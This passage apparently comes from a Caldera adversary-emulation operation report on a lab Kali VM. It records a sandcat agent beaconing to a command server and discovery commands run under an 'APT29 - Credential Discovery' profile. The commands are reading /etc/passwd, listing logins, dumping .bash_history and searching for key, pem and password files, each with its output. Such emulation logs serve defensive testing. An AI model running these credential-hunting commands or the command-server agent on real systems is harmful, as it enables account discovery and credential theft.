/usr/libexec/xdg-permission-storeosboxes     1929  0.0  0.3 539704  6540 ?        Ssl  02:23   0:00 /usr/libexec/xdg-document-portalroot        1935  0.0  0.0   2584  1820 ?        Ss   02:23   0:00 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1001/docosboxes     1940  0.0  0.7 406568 14772 ?        Ssl  02:23   0:00 /usr/libexec/xdg-desktop-portal-gtkosboxes     1959  0.0  4.8 2432864 95384 ?       Sl   02:23   0:02 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 28156 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser {cc09e74b-958e-4c13-9a20-1c5abef5454d} 1820 true tabosboxes     1988  0.0  6.0 2444408 119484 ?      Sl   02:23   0:03 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 29116 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser {52198898-bb0d-4c5d-b50c-5db0691c8ed8} 1820 true tabosboxes     2066  0.0  1.9 211992 38136 ?        Sl   02:23   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20250517152055 -sandboxingKind 0 -prefsLen 33744 -prefMapSize 249178 -appDir /usr/lib/firefox-esr/browser {002313d2-f979-4677-8653-c1f9e313bd37} 1820 true utilityosboxes     2074  0.0  3.5 2399136 70972 ?       Sl   02:23   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 3 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser {90cc678f-3918-439e-9592-1f9a2c284c3b} 1820 true tabosboxes     2077  0.0  3.5 2399136 71356 ?       Sl   02:23   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 4 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser {74e64c35-8896-459d-9ccc-cd712d5f0dd2} 1820 true tabosboxes     2087  0.0  3.5 2399136 71132 ?       Sl   02:23   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 5 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser {016151d6-4fbe-4ab8-9625-1549a7025165} 1820 true tabosboxes     6026  0.0  5.5 2436372 110880 ?      Sl   02:31   0:02 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 6 -isForBrowser -prefsLen 34089 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser {3c4e5dee-f48e-4471-8e8f-77373701c99f} 1820 true tabroot        6087  0.0  0.0      0     0 ?        I<   02:31   0:00 [kworker/u516:2-ttm]osboxes     6188  0.0  3.1 583744 62628 ?        Sl   02:31   0:01 /usr/bin/qterminalosboxes     6203  0.0  0.2   9068  4740 pts/0    Ss   02:31   0:00 /bin/bashosboxes     6839  0.0  0.7 1232512 13968 pts/0   Sl+  02:33   0:00 ./sandcat -server http://192.168.157.131:8888 -group red -vroot       36179  0.0  0.0      0     0 ?        I    03:32   0:00 [kworker/u514:1-events_unbound]root       53243  0.0  0.0      0     0 ?        I    04:07   0:00 [kworker/u513:3-events_unbound]root       53285  0.0  0.0      0     0 ?        I    04:07   0:00 [kworker/u514:2-flush-8:0]root       67965  0.0  0.0      0     0 ?        I    04:37   0:00 [kworker/u514:3-ext4-rsv-conversion]root       73135  0.0  0.0      0     0 ?        I<   04:47   0:00 [kworker/u517:2-ttm]root       83559  0.0  0.0      0     0 ?        I<   05:08   0:00 [kworker/u516:1]root       89159  0.0  0.0      0     0 ?        I    05:20   0:01 [kworker/1:1-mm_percpu_wq]root      103841  0.0  0.0      0     0 ?        I    05:50   0:00 [kworker/u513:0-kvfree_rcu_reclaim]root      103883  0.0  0.0      0     0 ?        I    05:50   0:01 [kworker/1:0-events]root      111246  0.0  0.0      0     0 ?        I    06:05   0:00 [kworker/u513:1-kvfree_rcu_reclaim]root      113287  0.0  0.0      0     0 ?        I<   06:09   0:00 [kworker/0:2H-kblockd]root      118395  0.0  0.0      0     0 ?        I    06:19   0:00 [kworker/0:1-events]root      121052  0.0  0.0      0     0 ?        I    06:25   0:00 [kworker/0:0-events_power_efficient]root      123718  0.0  0.0      0     0 ?        I    06:30   0:00 [kworker/0:2-events]osboxes   124510  0.0  0.0   2680  1480 pts/0    S+   06:32   0:00 sh -c ps auxosboxes   124511  0.0  0.2   9532  4468 pts/0    R+   06:32   0:00 ps aux","stderr":"","exit_code":"0"},"agent_reported_time":"2026-05-14T10:32:30Z"},{"link_id":"162d9695-ecd6-422c-a6a6-b946a3a75879","ability_id":"c901b98f-a48b-4682-b035-385fca55437a","command":"cat /etc/passwd","plaintext_command":"cat /etc/passwd","delegated":"2026-05-14T10:32:34Z","run":"2026-05-14T10:33:25Z","status":0,"platform":"linux","executor":"sh","pid":124954,"description":"","name":"Local Account Discovery","attack":{"tactic":"discovery","technique_name":"Account Discovery: Local Accounts","technique_id":"T1087.001"},"output":{"stdout":"root:x:0:0:root:/root:/usr/bin/zshdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin_apt:x:42:65534::/nonexistent:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologindhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/falsesystemd-timesync:x:992:992:systemd Time Synchronization:/:/usr/sbin/nologinmessagebus:x:991:991:System Message Bus:/nonexistent:/usr/sbin/nologintss:x:101:104:TPM software stack:/var/lib/tpm:/bin/falsestrongswan:x:102:65534::/var/lib/strongswan:/usr/sbin/nologintcpdump:x:103:105::/nonexistent:/usr/sbin/nologinsshd:x:990:65534:sshd user:/run/sshd:/usr/sbin/nologin_rpc:x:104:65534::/run/rpcbind:/usr/sbin/nologindnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologinavahi:x:105:108:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologinnm-openvpn:x:106:109:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologinspeech-dispatcher:x:107:29:Speech Dispatcher:/run/speech-dispatcher:/bin/falseusbmux:x:108:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologinnm-openconnect:x:109:110:NetworkManager OpenConnect plugin:/var/lib/NetworkManager:/usr/sbin/nologinpulse:x:110:111:PulseAudio daemon:/run/pulse:/usr/sbin/nologinlightdm:x:111:114:Light Display Manager:/var/lib/lightdm:/bin/falsestatd:x:112:65534::/var/lib/nfs:/usr/sbin/nologinsaned:x:113:115::/var/lib/saned:/usr/sbin/nologinpolkitd:x:989:989:User for polkitd:/:/usr/sbin/nologinrtkit:x:114:116:RealtimeKit:/proc:/usr/sbin/nologincolord:x:115:117:colord colour management daemon:/var/lib/colord:/usr/sbin/nologinmysql:x:116:119:MariaDB Server:/nonexistent:/bin/falsestunnel4:x:988:988:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologingeoclue:x:117:120::/var/lib/geoclue:/usr/sbin/nologinDebian-snmp:x:118:121::/var/lib/snmp:/bin/falsesslh:x:119:122::/nonexistent:/usr/sbin/nologincups-pk-helper:x:120:125:user for cups-pk-helper service:/nonexistent:/usr/sbin/nologinredsocks:x:121:126::/var/run/redsocks:/usr/sbin/nologin_gophish:x:122:128::/var/lib/gophish:/usr/sbin/nologiniodine:x:123:65534::/run/iodine:/usr/sbin/nologinmiredo:x:124:65534::/var/run/miredo:/usr/sbin/nologinredis:x:125:129::/var/lib/redis:/usr/sbin/nologinpostgres:x:126:130:PostgreSQL administrator:/var/lib/postgresql:/bin/bashmosquitto:x:127:131::/var/lib/mosquitto:/usr/sbin/nologininetsim:x:128:132::/var/lib/inetsim:/usr/sbin/nologin_gvm:x:129:134::/var/lib/openvas:/usr/sbin/nologinosboxes:x:1001:1001:osboxes.org,,,,:/home/osboxes:/bin/bash","stderr":"","exit_code":"0"},"agent_reported_time":"2026-05-14T10:33:24Z"},{"link_id":"34175cef-3400-4f13-ae33-29932fa598d6","ability_id":"975c571d-dcd1-4e02-9db5-cdc20e44a8da","command":"awk -F: '$3 == 0 {print $1}' /etc/passwd","plaintext_command":"awk -F: '$3 == 0 {print $1}' /etc/passwd","delegated":"2026-05-14T10:33:29Z","run":"2026-05-14T10:34:09Z","status":0,"platform":"linux","executor":"sh","pid":125328,"description":"","name":"Logged-in Users with UID 0","attack":{"tactic":"discovery","technique_name":"Account Discovery: Domain Accounts","technique_id":"T1087.001"},"output":{"stdout":"root","stderr":"","exit_code":"0"},"agent_reported_time":"2026-05-14T10:34:08Z"},{"link_id":"47d64ace-916e-4398-aa7f-e36731d25ba2","ability_id":"88d71e68-fcfc-4ca9-aecd-4ea473e2865d","command":"last","plaintext_command":"last","delegated":"2026-05-14T10:34:09Z","run":"2026-05-14T10:34:48Z","status":0,"platform":"linux","executor":"sh","pid":125647,"description":"","name":"Logged-in Users Ever Logged in Remotely","attack":{"tactic":"discovery","technique_name":"Account Discovery: Domain Accounts","technique_id":"T1087.001"},"output":{"stdout":"osboxes  tty7         :0               Wed May 13 18:10 - still logged inlightdm  tty7         :0               Wed May 13 18:09 - 18:10  (00:01)osboxes  tty7         :0               Wed May 13 15:40 - still logged inlightdm  tty7         :0               Wed May 13 15:40 - 15:40  (00:00)osboxes  tty7         :0               Tue May 12 16:23 - still logged inlightdm  tty7         :0               Tue May 12 15:34 - 16:23  (00:48)osboxes  tty7         :0               Tue Jan 13 04:00 - still logged inlightdm  tty7         :0               Tue Jan 13 03:59 - 04:00  (00:00)osboxes  tty7         :0               Thu Jan  8 05:12 - still logged inlightdm  tty7         :0               Thu Jan  8 05:07 - 05:12  (00:05)osboxes  tty7         :0               Tue Jan  6 08:55 - still logged inlightdm  tty7         :0               Tue Jan  6 08:48 - 08:55  (00:07)lightdm  tty7         :0               Tue Jan  6 05:58 - still logged inlightdm  tty7         :0               Tue Jan  6 05:55 - still logged inlightdm  tty7         :0               Tue Jan  6 05:07 - still logged inosboxes  tty7         :0               Tue Dec  9 10:13 - still logged inlightdm  tty7         :0               Tue Dec  9 10:12 - 10:13  (00:00)osboxes  tty7         :0               Tue Dec  9 10:04 - 10:08  (00:04)lightdm  tty7         :0               Tue Dec  9 10:03 - 10:04  (00:01)lightdm  tty7         :0               Sat Jun 14 18:47 - 16:49 (213503982+06:04)osboxes  tty7         :0               Sat Jun 14 17:03 - 17:03  (00:00)lightdm  tty7         :0               Sat Jun 14 17:00 - 17:03  (00:02)osboxes  tty7         :0               Sat Jun 14 16:57 - 17:00  (00:02)lightdm  tty7         :0               Sat Jun 14 16:55 - 16:57  (00:02)kali     tty7         :0               Sat Jun 14 16:49 - 16:55  (00:05)postgres                               Thu May 29 15:22 - 15:22  (00:00)wtmpdb begins Thu May 29 15:22:05 2025","stderr":"","exit_code":"0"},"agent_reported_time":"2026-05-14T10:34:48Z"},{"link_id":"cdc71df3-f707-44c4-80b2-35c0177354e8","ability_id":"cc89d17f-b727-47ef-b7f1-8c10e55465d5","command":"find /home -name \".bash_history\" -exec cat {} \\; 2>/dev/null; find / -name \"*.key\" -o -name \"*.pem\" -o -name \"*password*\" 2>/dev/null | head -20","plaintext_command":"find /home -name \".bash_history\" -exec cat {} \\; 2>/dev/null; find / -name \"*.key\" -o -name \"*.pem\" -o -name \"*password*\" 2>/dev/null | head -20","delegated":"2026-05-14T10:34:49Z","run":"2026-05-14T10:35:46Z","status":0,"platform":"linux","executor":"sh","pid":126094,"description":"Search for credentials in bash history and key files","name":"Credential File Discovery","attack":{"tactic":"credential-access","technique_name":"Unsecured Credentials: Credentials in Files","technique_id":"T1552.001"},"output":{"stdout":"/boot/grub/i386-pc/password.mod/boot/grub/i386-pc/legacy_password_test.mod/boot/grub/i386-pc/password_pbkdf2.mod/run/systemd/ask-password/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/google_aosp.pem/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/oracle_java.pem/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/apple.pem/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/microsoft_windows.pem/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/mozilla_nss.pem/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/openjdk.pem/usr/lib/python3/dist-packages/tornado/test/test.key/usr/lib/python3/dist-packages/pip/_vendor/certifi/cacert.pem/usr/lib/python3/dist-packages/samba/netcmd/domain/__pycache__/passwordsettings.cpython-313.pyc/usr/lib/python3/dist-packages/samba/netcmd/domain/passwordsettings.py/usr/lib/python3/dist-packages/samba/netcmd/user/password.py/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/__pycache__/getpassword.cpython-313.pyc/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/__pycache__/syncpasswords.cpython-313.pyc/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/getpassword.py/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/syncpasswords.py","stderr":"","exit_code":"0"},"agent_reported_time":"2026-05-14T10:35:43Z"}]}},"finish":null,"planner":"atomic","adversary":{"adversary_id":"30e08fc6-37f3-4a55-9448-e27d4eb69d8c","name":"APT29 - Credential Discovery","description":"---","atomic_ordering":["bbccdf00-404a-4b03-8706-bf3f3062bf85","e28955de-dcaf-4fdd-8bc5-9ac4e86ec65e","c901b98f-a48b-4682-b035-385fca55437a","975c571d-dcd1-4e02-9db5-cdc20e44a8da","88d71e68-fcfc-4ca9-aecd-4ea473e2865d","cc89d17f-b727-47ef-b7f1-8c10e55465d5"],"objective":"495a9828-cab1-44dd-a0ca-66e58177d8cc","tags":[],"has_repeatable_abilities":false,"plugin":""},"jitter":"2/8","objectives":{"id":"495a9828-cab1-44dd-a0ca-66e58177d8cc","name":"default","description":"This is a default objective that runs forever.","goals":[{"target":"exhaustion","value":"complete","count":1048576,"operator":"==","achieved":false}],"percentage":0},"facts":[{"unique":"file.sensitive.extensionwav","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"wav","created":"2026-05-13T21:55:17Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"file.sensitive.extensionyml","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"yml","created":"2026-05-13T21:55:17Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"file.sensitive.extensionpng","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"png","created":"2026-05-13T21:55:17Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"server.malicious.urlkeyloggedsite.com","trait":"server.malicious.url","name":"server.malicious.url","value":"keyloggedsite.com","created":"2026-05-13T21:55:17Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"host.file.path//www.kali.org/\"","trait":"host.file.path","name":"host.file.path","value":"//www.kali.org/\"","created":"2026-05-14T10:31:33Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["ce1058b0-8889-4f64-b4a4-93fdd437bd85"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1016"},{"unique":"host.file.path//forums.kali.org/\"","trait":"host.file.path","name":"host.file.path","value":"//forums.kali.org/\"","created":"2026-05-14T10:31:33Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["ce1058b0-8889-4f64-b4a4-93fdd437bd85"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1016"},{"unique":"host.file.path//bugs.kali.org/\"","trait":"host.file.path","name":"host.file.path","value":"//bugs.kali.org/\"","created":"2026-05-14T10:31:33Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["ce1058b0-8889-4f64-b4a4-93fdd437bd85"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1016"},{"unique":"host.file.path/run/credentials/systemd-journald.service","trait":"host.file.path","name":"host.file.path","value":"/run/credentials/systemd-journald.service","created":"2026-05-14T10:31:33Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["ce1058b0-8889-4f64-b4a4-93fdd437bd85"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1016"},{"unique":"host.file.path/run/credentials/getty@tty1.service","trait":"host.file.path","name":"host.file.path","value":"/run/credentials/getty@tty1.service","created":"2026-05-14T10:31:33Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["ce1058b0-8889-4f64-b4a4-93fdd437bd85"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1016"},{"unique":"host.ip.address192.168.157.131","trait":"host.ip.address","name":"host.ip.address","value":"192.168.157.131","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/bin/pipewire -c filter-chain.conf","trait":"host.file.path","name":"host.file.path","value":"/usr/bin/pipewire -c filter-chain.conf","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf","trait":"host.file.path","name":"host.file.path","value":"/usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/bin/python3 /usr/share/system-config-printer/applet.py","trait":"host.file.path","name":"host.file.path","value":"/usr/bin/python3 /usr/share/system-config-printer/applet.py","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/libexec/geoclue-2.0/demos/agent","trait":"host.file.path","name":"host.file.path","value":"/usr/libexec/geoclue-2.0/demos/agent","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/libexec/gvfsd-trash --spawner :1.24","trait":"host.file.path","name":"host.file.path","value":"/usr/libexec/gvfsd-trash --spawner :1.24","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 28156 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 28156 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/browser/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/browser/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":["[]"],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 29116 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 29116 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/firefox-esr -contentproc -childID 3 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/firefox-esr -contentproc -childID 3 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/firefox-esr -contentproc -childID 4 -isForBrowser -prefsLen 31163 